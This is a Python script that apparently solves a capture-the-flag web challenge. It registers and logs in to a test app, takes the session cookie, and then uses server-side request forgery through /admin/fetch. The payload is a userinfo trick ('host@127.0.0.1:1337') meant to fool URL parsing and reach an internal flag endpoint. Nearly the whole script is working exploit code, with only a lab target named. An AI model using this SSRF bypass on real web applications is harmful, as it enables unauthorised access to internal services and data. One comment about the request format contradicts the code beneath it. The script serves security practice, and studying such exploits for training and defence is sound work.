import requests

# Base URL of the web application
BASE_URL = "http://nginx:80"

# User credentials
USERNAME = "testuser"
PASSWORD = "testpassword"

# 1. Register a new user
print(f"[*] Registering user: {USERNAME}")
register_url = f"{BASE_URL}/register"
register_data = {
    "username": USERNAME,
    "password": PASSWORD
}
# Flask expects form data for register now
register_resp = requests.post(register_url, json=register_data, allow_redirects=False)
print(f"[*] Register response status: {register_resp.status_code}")
print(f"[*] Register response headers: {register_resp.headers}")

# 2. Login to get session cookie
print(f"[*] Logging in as: {USERNAME}")
login_url = f"{BASE_URL}/login"
login_data = {
    "username": USERNAME,
    "password": PASSWORD
}
# Flask expects JSON for login
login_resp = requests.post(login_url, json=login_data, allow_redirects=False)
print(f"[*] Login response status: {login_resp.status_code}")
print(f"[*] Login response headers: {login_resp.headers}")

# Extract session cookie
session_cookie = None
if 'Set-Cookie' in login_resp.headers:
    for cookie in login_resp.headers['Set-Cookie'].split(';'):
        if 'session=' in cookie:
            session_cookie = cookie.split('session=')[1].split(',')[0].strip()
            break
print(f"[*] Session cookie: {session_cookie}")

if not session_cookie:
    print("[!] Failed to get session cookie. Exiting.")
    exit()

cookies = {'session': session_cookie}

# 3. Exploit SSRF via /admin/fetch
print(f"[*] Attempting SSRF to fetch flag from /internal")
fetch_url = f"{BASE_URL}/admin/fetch?x=1"
# Using basic auth bypass to trick urlparse but hit localhost
ssrf_target_url = "http://daffainfo.com@127.0.0.1:1337/internal"
fetch_data = {
    "url": ssrf_target_url
}

# The admin_fetch route expects form data, not JSON
fetch_resp = requests.post(fetch_url, data=fetch_data, cookies=cookies)
print(f"[*] SSRF response status: {fetch_resp.status_code}")
print(f"[*] SSRF response text:\n{fetch_resp.text}")
